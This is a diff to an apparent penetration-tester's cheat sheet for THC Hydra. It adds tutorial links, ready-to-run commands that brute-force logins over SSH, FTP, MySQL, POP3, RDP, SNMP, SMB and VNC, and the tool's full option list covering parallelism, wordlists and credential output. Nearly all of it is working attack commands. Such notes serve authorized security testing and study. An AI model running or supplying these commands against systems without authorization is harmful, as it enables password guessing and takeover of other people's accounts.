@@ -1,4 +1,42 @@
-SSH
-hydra -l named_user -P passlist.txt 192.168.0.100 <ssh|ftp>
+https://github.com/vanhauser-thc/thc-hydra
+https://techyrick.com/hydra-full-tutorial/
+https://securitytutorials.co.uk/brute-forcing-passwords-with-thc-hydra/
 
-hydra -L userlist.txt -P passlist.txt 192.168.0.100 <ssh|ftp>
+<ssh://<IP> >
+hydra -v -l named_user -P passlist.txt 192.168.0.100 <ssh|ftp| mysql|pop3> 
+hydra -v -L userlist.txt -P passlist.txt 192.168.0.100 <ssh|ftp| mysql|pop3>
+
+hydra -v -f -L <userslist> -P <passwlist> rdp://<IP>
+hydra -P common-snmp-community-strings.txt <IP> snmp
+hydra  -t 1 -l Administrator -P dic.txt <IP> smb
+
+
+hydra -L username.txt -P password.txt <IP> ftp -s 21
+hydra -P passwordlist -t 1 -w 5 -f -s 5901 <IP> vnc -v
+
+
+
+Options:
+ -R restore a previous aborted/crashed session
+ -I ignore an existing restore file (dont wait 10 seconds)
+ -S perform an SSL connect
+ -s PORT if the service is on a different default port, define it here
+ -l LOGIN or -L FILE login with LOGIN name, or load several logins from FILE
+ -p PASS or -P FILE try password PASS, or load several passwords from FILE
+ -x MIN:MAX:CHARSET password bruteforce generation, type "-x -h" to get help
+ -y disable use of symbols in bruteforce, see above
+ -e nsr try "n" null password, "s" login as pass and/or "r" reversed login
+ -u loop around users, not passwords (effective! implied with -x)
+ -C FILE colon separated "login:pass" format, instead of -L/-P options
+ -M FILE list of servers to attack, one entry per line, ':' to specify port
+ -o FILE write found login/password pairs to FILE instead of stdout
+ -b FORMAT specify the format for the -o FILE: text(default), json, jsonv1
+ -f / -F exit when a login/pass pair is found (-M: -f per host, -F global)
+ -t TASKS run TASKS number of connects in parallel per target (default: 16)
+ -T TASKS run TASKS connects in parallel overall (for -M, default: 64)
+ -w / -W TIME waittime for responses (32) / between connects per thread (0)
+ -4 / -6 use IPv4 (default) / IPv6 addresses (put always in [] also in -M)
+ -v / -V / -d verbose mode / show login+pass for each attempt / debug mode 
+ -O use old SSL v2 and v3
+ -q do not print messages about connection errors
+ -U service module usage details
